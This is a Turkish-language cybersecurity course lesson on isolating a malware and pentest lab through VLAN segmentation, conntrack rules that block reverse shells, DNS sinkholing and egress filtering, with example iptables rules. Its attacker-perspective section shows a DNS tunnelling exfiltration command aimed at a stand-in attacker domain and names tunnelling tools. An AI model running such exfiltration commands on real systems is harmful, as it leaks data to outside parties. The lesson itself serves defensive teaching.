# GÜN 011: Laboratuvar Ağ Sınırları
**Aşama 01: Temel Kavramlar ve Tehdit Ortamı | Hafta 02: Güvenli Ortam ve Temel Altyapı**

![Lisans](https://img.shields.io/badge/license-All%20Rights%20Reserved-red?style=flat-square)
![Süre](https://img.shields.io/badge/s%C3%BCre-90%20dakika-blue?style=flat-square)
![Seviye](https://img.shields.io/badge/seviye-Temel%20%2F%20Orta-orange?style=flat-square)

> **ÖZEL LİSANS — TÜM HAKLAR SAKLIDIR**  
> Telif Hakkı (c) 2026 Seydi Eryılmaz (@seydivakkas)  
> Bu yazılım ve eğitim materyalleri yalnızca görüntüleme ve kişisel öğrenim amaçlıdır.  
> Kopyalanamaz, çoğaltılamaz, dağıtılamaz, ticari amaçla kullanılamaz. Açık kaynak lisanslar (MIT, Apache, GPL vb.) KULLANILMAZ.

---

## 1. Hocanın Giriş Sohbeti & Zihinsel Model (Mental Model)

Evlat, masamıza hoş geldin. İlk 10 günde işletim sistemlerinin çekirdeklerine dokunduk; Windows'u çekerocak gibi kurduk, Linux'u CIS Seviye 1 standartlarında sertleştirdik. Bugün ise siber güvenlik laboratuvarımızın can damarına, makinelerimizi birbirine bağlayan ama aynı zamanda birbirinden kurşun geçirmez duvarlarla ayıran **Laboratuvar Ağ Sınırları (Network Boundaries)** konusuna geliyoruz.

Sana sorsam: *"Evlat, bir penetrasyon testi veya zararlı yazılım analizi laboratuvarı kurarken kurban makine ile saldırgan makineyi nasıl bağlarsın?"*
Eğer bana *"Hocam, ikisini de VirtualBox'ta NAT veya Bridged yapıp aynı ağa koyarım"* dersen; seni o laboratuvara sokmam!

Neden mi? Sana harika bir zihinsel model vereyim: **Denizaltı Su Geçirmez Bölmeleri (Bulkheads) ve Hastane Karantina Hava Kilitleri (Airlocks)!**

Bir askeri denizaltı düşün: Torpido yediğinde veya bir odasına su dolduğunda ne olur?
Eğer denizaltı tek bir açık hangardan (Düz Ağ - Flat Network) ibaret olsaydı; su tüm gövdeye yayılır ve koca denizaltı dakikalar içinde batardı. Oysa denizaltının içinde çelik su geçirmez kapılar (Bulkheads) vardır. Torpido vurduğu an o kapılar mühürlenir. Vurulan oda feda edilir, su sadece o bölmede hapsolur; denizaltı ve mürettebat görevine devam eder!

Siber güvenlik laboratuvarında da durum tıpatıp böyledir:
Sen laboratuvarında ölümcül bir fidye yazılımı (ransomware) veya solucan (worm) patlatacaksın. Kurban makine enfekte olduğunda o bizim su alan odamızdır. Eğer kurban makine ile senin ana bilgisayarın (konak), evindeki modem veya şirketinin yerel ağı aynı ağdaysa (Düz Ağ); o fidye yazılımı sadece o sanal makineyi değil, evindeki akıllı televizyondan şirketindeki muhasebe sunucularına kadar her şeyi şifreler!

İşte bu yüzden biz **Ağ Sınırları (Network Boundaries)** ve **Mikro-Segmentasyon** inşa ederiz. Laboratuvarımızı 4 ayrı hava kilitli odaya böleriz: Karantina Odası, Kırmızı Takım Odası, Mavi Takım Odası ve Yönetim Odası. Odalar arasındaki trafiği ise öyle bir güvenlik duvarı kuralıyla kilitleriz ki; saldırgan kurbana saldırabilir ama kurban asla saldırgana veya dış internete sızıntı yapamaz!

---

## 2. Sıfırdan Başlayan Kristal Netliğinde Teori

### A. Düz Ağın (Flat Network) Ölümcül Tehlikeleri

Bir ağda tüm cihazların aynı IP bloğunda (örneğin `192.168.1.0/24`) ve aynı yayın etki alanında (Broadcast Domain) bulunmasına **Düz Ağ (Flat Network)** denir. Evlerimizdeki Wi-Fi ağları böyledir; ancak bir güvenlik laboratuvarında düz ağ kullanmak intihardır:
1. **ARP Zehirlenmesi (ARP Spoofing / Poisoning):** Düz ağdaki herhangi bir cihaz, sahte ARP yanıtları göndererek kendini ağ geçidi (router) gibi tanıtabilir ve diğer tüm sanal makinelerin trafiğini açık metin olarak dinleyebilir (Man-in-the-Middle).
2. **Yanal Yayılma (Lateral Movement):** Kurban sanal makinede çalışan bir SMB solucanı (WannaCry gibi), ağdaki diğer tüm IP adreslerine port 445 üzerinden saldırı paketleri püskürtür. Düz ağda bunu durduracak hiçbir engel yoktur!
3. **DNS ve DHCP Zehirlenmesi:** Kurban makinedeki bir trojan, ağa sahte DHCP sunucusu kurarak diğer sanal makinelerin internet trafiğini kendi üzerine çekebilir.

### B. Mikro-Segmentasyon ve 4 Temel Güvenlik Bölgesi (VLAN Mimarisi)

Profesyonel bir siber güvenlik laboratuvarında ağ, mantıksal olarak birbirinden izole edilmiş sanal yerel ağlara (**VLAN - Virtual Local Area Network**) bölünür:

```
+-----------------------------------------------------------------------------+
|               KURUMSAL LABORATUVAR MİKRO-SEGMENTASYON BÖLGELERİ             |
+-----------------------------------------------------------------------------+

 1. KARANTİNA / PATLATMA BÖLGESİ (DETONATION ZONE - VLAN 66: 192.168.66.0/24):
    - Kurban Windows 10, Flare-VM, REMnux makineleri burada oturur.
    - Dış internete (0.0.0.0/0) çıkış rotası KESİNLİKLE YOKTUR (Blackhole).
    - Tüm DNS sorguları içerideki sahte DNS sunucusuna (Sinkhole) hapsedilir.

 2. KIRMIZI TAKIM / SALDIRI BÖLGESİ (ATTACKER ZONE - VLAN 10: 192.168.10.0/24):
    - Kali Linux, Parrot OS, sızma testi ve exploit araçları buradadır.
    - Kurbana doğru yalnızca kontrollü test portlarına (80, 443, 445, 3389) erişebilir.

 3. MAVİ TAKIM / GÖZLEM BÖLGESİ (SOC / SIEM ZONE - VLAN 20: 192.168.20.0/24):
    - Wazuh SIEM yöneticisi, Zeek ağ izleyicisi, Suricata IDS ve Syslog sunucusu.
    - Kurbandan sadece gelen telemetri ve log paketlerini kabul eder (Port 514, 1514).
    - Kurbana doğrudan bağlantı başlatamaz.

 4. YÖNETİM BÖLGESİ (OUT-OF-BAND MANAGEMENT - VLAN 99: 192.168.99.0/24):
    - Analistin fiziksel konak bilgisayarından yalnızca hypervisor veya firewall
      yönetim arayüzüne güvenli erişim sağlayan izole yönetim kanalı.
```

### C. Durum Takipli Güvenlik Duvarı (Statefull Conntrack) ve Asimetrik Trafik

Ağ sınırlarında çalışan güvenlik duvarı (iptables, nftables, pfSense), paketleri yalnızca kaynak ve hedef IP'ye göre değil, bağlantının durumuna (**Connection Tracking - Conntrack**) göre denetler:
* **`NEW`:** Yeni başlatılmak istenen bir bağlantının ilk paketi (TCP SYN paketi).
* **`ESTABLISHED`:** Daha önce iki taraf arasında karşılıklı el sıkışılmış ve onaylanmış aktif bir oturumun paketleri.
* **`RELATED`:** Mevcut bir oturumla ilişkili yeni bir yan kanal (örneğin FTP veri kanalı veya ICMP hata mesajı).
* **`INVALID`:** Hiçbir oturuma ait olmayan, bozuk veya sahte paketler.

#### Asimetrik Trafik Kuralının Büyüsü: Tersine Kabuk (Reverse Shell) Nasıl Engellenir?
Diyelim ki Kırmızı Takım (Saldırgan) kurbana bir exploit gönderdi ve kurbanı ele geçirdi. Saldırgan kurbana komut vermek için bir **Tersine Kabuk (Reverse Shell)** tetikler; kurban makine saldırganın dinlediği porta (ör. 4444) doğru yeni bir TCP bağlantısı açmaya çalışır.

İşte tam bu noktada ağ sınırımızdaki kural devreye girer:
1. `Saldırgan -> Kurban` yönünde: `state NEW,ESTABLISHED -j ACCEPT` (Saldırgan kurbana yeni oturum başlatabilir).
2. `Kurban -> Saldırgan` yönünde: `state ESTABLISHED,RELATED -j ACCEPT` (Kurban yalnızca saldırganın açtığı oturumlara YANIT dönebilir; kurbandan saldırgana doğru `NEW` paket gitmesi KESİNLİKLE YASAKTIR!).

Kurban makinedeki zararlı yazılım saldırgana doğru `NEW` bağlantı açmaya kalktığı anda, güvenlik duvarı paketi yakalar ve sessizce çöpe atar (`DROP`). Tersine kabuk boğulur; zararlı içeride kilitli kalır!

### D. DNS Sinkholing: Zararlıyı Sahte Dünyada Yaşatmak

Zararlı yazılımların %99'u, çalıştırıldığında ilk iş olarak internetteki Komuta Kontrol (C2) sunucusunun alan adını (örneğin `dark-apt-c2.net`) çözmek için bir DNS sorgusu (UDP 53) fırlatır.

Eğer kurbanın dış DNS'e (Google 8.8.8.8, Cloudflare 1.1.1.1) gitmesine izin verirsen:
1. Analistin gerçek IP adresi internetteki DNS sunucularının loglarına düşer.
2. Gelişmiş zararlılar DNS Tünelleme (DNS Tunneling) araçlarıyla (Iodine, DNSCat2) çaldıkları verileri DNS sorgularının içine gömerek dışarı sızdırır!

**Çözüm: DNS Sinkhole (Yutak):**
Ağ geçidimize şu iptables yönlendirmesini koyarız:
`iptables -t nat -A PREROUTING -s 192.168.66.0/24 -p udp --dport 53 -j DNAT --to-destination 192.168.66.2:53`
Kurban makine nereye DNS sorgusu atarsa atsın, paket ağ geçidinde yakalanır ve içerideki **INetSim** sahte DNS sunucusuna (`192.168.66.2`) teslim edilir. INetSim her sorguya *"Evet, o sunucu benim, IP adresim 192.168.66.2"* cevabı verir. Zararlı yazılım kandırıldığını anlamaz; sahte HTTP/HTTPS sunucumuza bağlanır ve attığı her istek güvenle loglanır!

### E. Egress Filtering (Çıkış Filtrelemesi): En İhmal Edilen Kalkan

Şirketlerdeki güvenlik mühendisleri hep içeri giren trafiği (Ingress) filtrelemeye odaklanır; kaleden dışarı çıkan trafiğe (Egress) kimse bakmaz. Oysa bir laboratuvarda en kritik kalkan **Egress Filtering**'dir!
* Karantina bölgesinin varsayılan ağ geçidi (Default Gateway) rotası internete `0.0.0.0/0` yönlendirmesi içermemelidir.
* Karantinadan dış dünyaya yönlenen her paket anında loglanmalı ve düşürülmelidir:
  `iptables -A FORWARD -s 192.168.66.0/24 -o eth0 -j LOG --log-prefix "[LAB-SIZINTI-ENGELI]: "`
  `iptables -A FORWARD -s 192.168.66.0/24 -o eth0 -j DROP`

---

## 3. İki Yönlü Bakış: Saldırganın Gözü (Offensive) vs Savunmacının Kalkanı (Defensive)

### 🔴 Saldırganın Gözü (Offensive Perspective)

Bir sızma testi uzmanı veya tehdit aktörü laboratuvar ortamında kurban makineye sızdıktan sonra şu kaçış ve sızıntı yollarını arar:
1. **DNS Tünelleme (DNS Tunneling):** Dışarıya TCP portları (80, 443) kapalıysa, `nslookup -type=TXT secretdata.attacker.com` komutuyla DNS sorguları içine hassas verileri bayt bayt kodlayıp sızdırmayı dener.
2. **ICMP Tünelleme (Ping Tunneling):** Güvenlik duvarı ping paketlerini engellemiyorsa, ICMP echo request paketlerinin veri yüküne (payload) şifreli komutlar gömer (`nping`, `ptunnel`).
3. **Pivoting (Ağ Atlama):** Ele geçirdiği kurban makinenin ağ kartlarını (`ip a`, `ifconfig`) inceler. Eğer makine hem laboratuvar ağına hem de köprülenmiş (Bridged) bir şirket ağına bağlıysa (Dual-Homed); kurbanı bir atlama tahtası (proxy/pivot) yaparak şirket iç ağına sızar.

---

### 🔵 Savunmacının Kalkanı (Defensive Perspective)

Biz savunmacılar olarak ağ sınırlarımızı şu zırhlarla mühürleriz:
1. **Mikro-Segmentasyon:** Kurban, saldırgan ve gözlem düğümleri ayrı VLAN'larda yaşar; yayın paketleri (broadcast) ve ARP zehirlenmesi sınır ötesine geçemez.
2. **Asimetrik Conntrack Kalkanı:** Kurbandan saldırgana doğru `NEW` paket çıkışı yasaklanarak tersine kabuklar öldürülür.
3. **DNS Sinkholing:** Dış DNS sorguları bloke edilir; tüm istekler yerel INetSim simülatörüne yönlendirilir.
4. **Çıkış Filtrelemesi (Strict Egress Filtering):** Karantinadan internete sıfır rota politikası uygulanır; sızıntı denemeleri SIEM'e alarm üretir.

---

## 4. Hocayla Birlikte Canlı Laboratuvar (Gerçek Kod & Canlı Sistem)

Bugün geliştirdiğimiz `lab_network_boundary_auditor.py` aracı; verilen laboratuvar ağ topolojilerini satır satır inceler ve sızıntısız kurumsal `iptables_rules.sh` betiği üretir.

### A. İncelenen Topolojiler

`portfolio/hafta_02/gun_011/ornek_veri/laboratuvar_ag_topolojisi.json` dosyamızda iki zıt ağ mimarisi modelledik:
* `TOPOLOGY-SEC-01 (Sertleştirilmiş Mikro-Segmentasyon)`: 4 ayrı VLAN (Karantina .66.0, Saldırgan .10.0, SOC .20.0, Yönetim .99.0), Statefull conntrack aktif, DNS sinkhole devrede, karantina internet çıkışı sıfır.
* `TOPOLOGY-RISK-99 (Güvensiz Düz Ağ)`: Tek bir düz ağ (.1.0/24), kurban ve saldırgan ev modemiyle aynı havuzda, internet çıkışı açık, DNS sinkhole yok, conntrack kapalı.

### B. Canlı Denetimin Çalıştırılması

Öğrenci olarak terminalinde şu komutu yürüt:

```bash
python portfolio/hafta_02/gun_011/uygulama/lab_network_boundary_auditor.py --topology portfolio/hafta_02/gun_011/ornek_veri/laboratuvar_ag_topolojisi.json
```

Terminal çıktısında göreceğin gerçek rapor:
* `TOPOLOGY-SEC-01`: Güvenlik Skoru **100/100** | Durum: **GÜVENLİ (MİKRO-SEGMENTE İZOLE LAB)** | 0 Bulgu.
* `TOPOLOGY-RISK-99`: Güvenlik Skoru **0/100** | Durum: **KRİTİK FELAKET (ACİL MÜDAHALE GEREKLİ)** | 8 Kritik Bulgu! (Karantina internete açık, düz ağ riski, DNS sızıntısı, conntrack kapalı vb.).

### C. Kurumsal Güvenlik Duvarı Kural Betiğinin Üretilmesi

Sertleştirilmiş laboratuvarımız için üretim kalitesinde iptables betiğini tek komutla üretebilirsin:

```bash
python portfolio/hafta_02/gun_011/uygulama/lab_network_boundary_auditor.py --topology portfolio/hafta_02/gun_011/ornek_veri/laboratuvar_ag_topolojisi.json --topology-id TOPOLOGY-SEC-01 --generate-iptables portfolio/hafta_02/gun_011/ornek_veri/iptables_rules.sh
```

Üretilen [iptables_rules.sh](file:///c:/Users/seydieryilmaz/Desktop/Siber_Guvenlik_365_Gun_Standart_ve_Mufredat_Paketi/portfolio/hafta_02/gun_011/ornek_veri/iptables_rules.sh) betiğini ağ geçidinde (Linux Router / pfSense) çalıştırdığında; ağ sınırların kurşun geçirmez çelik kapılarla kilitlenecektir!

---

## 5. Hocanın "Ölümcül Hatalar" Notu

Evlat, bu 5 ölümcül hatayı iş hayatında asla yapmayacaksın:

1. **"Analiz Kurbanını NAT ile Doğrudan Ev Modemine Bağlamak"**:
   * *Felaket:* Kurban makinedeki zararlı yazılım dışarıdaki gerçek C2 sunucusuna bağlanır, analistin gerçek IP adresini ifşa eder veya internetteki başka kurbanlara saldırarak analisti suçlu durumuna düşürür!
   * *Doğrusu:* Karantina ağı internete tamamen kapalı tutulmalı; sahte internet simülatörleri (INetSim) kullanılmalıdır.

2. **"Saldırgan ve Kurbanı Aynı Düz Ağda (Flat Network) Çalıştırmak"**:
   * *Felaket:* Kurban makine hacklendiğinde saldırgan ARP zehirlenmesi veya broadcast koklama ile analistin tüm test trafiğini çalar.
   * *Doğrusu:* En az 3 ayrı VLAN (Karantina, Saldırgan, SOC) zorunludur.

3. **"Dış DNS Sunucularına (8.8.8.8) İzin Verip DNS Tünellemeye Göz Yummak"**:
   * *Felaket:* Zararlı yazılım güvenlik duvarını DNS tünelleme ile aşar ve tüm hassas verileri internete sızdırır.
   * *Doğrusu:* Dış DNS tamamen engellenmeli; tüm 53 portu DNS Sinkhole sunucusuna yönlendirilmelidir.

4. **"Durum Takipsiz Güvenlik Duvarı Kullanarak Tersine Kabuğa (Reverse Shell) İzin Vermek"**:
   * *Felaket:* Kurban makine saldırgana doğru yeni TCP bağlantısı açarak tersine kabuk fırlatır ve kurban ağından dışarıya tünel açılır.
   * *Doğrusu:* Kurbandan çıkan paketlerde `NEW` kesinlikle yasaklanmalı, yalnızca `ESTABLISHED,RELATED` kabul edilmelidir.

5. **"Çıkış Filtrelemesini (Egress) Unutup Sadece Girişi (Ingress) Korumak"**:
   * *Felaket:* Dışarıdan içeriye kimse giremez ama içeride patlayan virüs her yere veri kaçırır.
   * *Doğrusu:* Karantina ağından çıkan her paket sıkı denetimden geçirilmeli ve izinsiz çıkışlar loglanıp düşürülmelidir.

---

## 6. Hocanın Soru Odası (Kapsamlı Soru-Cevap)

Müfredatımızın `SORU BANKASI` içinde yer alan `G011-SC1`, `G011-SC2` ve `G011-SC3` numaralı soruların usta-çırak derinliğindeki yanıtları:

* **Soru 1 (G011-SC1):** Laboratuvar ağ sınırları: Temel mekanizmayı ve güvenlik önemini açıkla.
  * *Hocanın Yanıt Özeti:* Laboratuvar ağ sınırları; denizaltı su geçirmez bölmeleri (Bulkheads) gibi patlatma alanını (Blast Radius) sınırlandıran mikro-segmentasyon ve durum takipli güvenlik duvarı mimarisidir. Kurban makinelerin hacklenmesi veya fidye yazılımı ile enfekte olması durumunda tahribatın şirketin yerel ağına veya dış internete yayılmasını (Lateral Movement & Exfiltration) önler.
* **Soru 2 (G011-SC2):** Laboratuvar ağ sınırları: Bağımsız laboratuvarın girdisi, işlemi, beklenen sonucu ve negatif kontrolü nedir?
  * *Hocanın Yanıt Özeti:* Girdisi ağ topolojisi ve güvenlik duvarı kurallarını içeren JSON profili; işlemi VLAN mikro-segmentasyonu, karantina internet çıkış engeli, DNS sinkhole yönlendirmesi ve asimetrik conntrack kurallarının denetlenmesi; beklenen sonucu 100/100 güvenlik skoru ve kurumsal `iptables_rules.sh` kural setinin üretilmesi; negatif kontrolü ise karantinaya internet çıkışı (`0.0.0.0/0`) veya tersine kabuk (`NEW`) izni verildiğinde sistemin işlemi FELAKET seviyesinde reddetmesidir.
* **Soru 3 (G011-SC3):** 'Laboratuvar ağ sınırları' bağlamında risk nasıl oluşur, nasıl tespit edilir ve hangi kontrolle önlenir?
  * *Hocanın Yanıt Özeti:* Risk; düz ağ tasarımı, karantinadan kontrolsüz internet çıkışı ve DNS sızıntılarının zararlıya yayılma ve veri kaçırma fırsatı sunmasıyla oluşur. Ağ denetim motorları, yönlendirme tabloları (`ip route`) ve kural dökümleri (`iptables -L -v -n`) ile tespit edilir. 4 bölgeli VLAN mimarisi, DNS Sinkholing ve asimetrik statefull conntrack kuralları ile önlenir.

*(Detaylı kurumsal yanıtların tamamı `soru_cevap.md` dosyasında yer almaktadır.)*

---

## 7. Ödev & Bir Sonraki Güne Hazırlık

1. **Günün Pratik Ödevi:**
   Kendi sanal makine yazılımında (VirtualBox veya VMware) sanal ağ yöneticisini (Virtual Network Editor) aç. Ağ adaptörlerinin "Host-Only", "Internal" ve "NAT" olarak nasıl yapılandırıldığını incele. Kurban makinenin ağ kartını "Internal Network" moduna alarak dış internete çıkamadığını (`ping 8.8.8.8`) doğrula!
2. **Yarın Bizi Ne Bekliyor (GÜN 012)?**
   Yarın ağ sınırlarını cebimize koyup işletim sistemi derinliklerine geri dönüyoruz: **Temel Linux Komutları ve Dosya Sistemi Hiyerarşisi (FHS)** konusuna adım atacağız. Linux dosya sisteminin köklerinden uçlarına kadar bir dedektif gibi iz sürmeyi öğreneceğiz.

Tebrikler evlat, laboratuvar ağının çelik kapılarını başarıyla mühürledik!
